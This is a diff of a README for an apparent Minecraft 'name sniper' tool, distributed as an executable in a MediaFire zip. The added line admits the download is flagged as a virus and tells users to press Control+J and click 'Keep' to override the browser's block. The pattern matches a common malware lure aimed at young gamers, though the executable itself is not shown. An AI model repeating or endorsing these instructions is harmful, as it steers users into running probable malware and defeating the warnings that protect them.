@@ -6,3 +6,5 @@ Free Software to track down and snipe OG minecraft names!
 Donwload: http://www.mediafire.com/file/8ej4y6b8wadr5zl/MC_NameSniper.zip/file
 
 Instalation Process: Just Download and Extract The Zip File then Execute "NameMC_Sniper.exe" and Follow The Instructions! Happy Sniping =)
+
+The Folder Is Marked As Virus, But Don't Get Harmed. Just do "Control + J" and click "Keep"
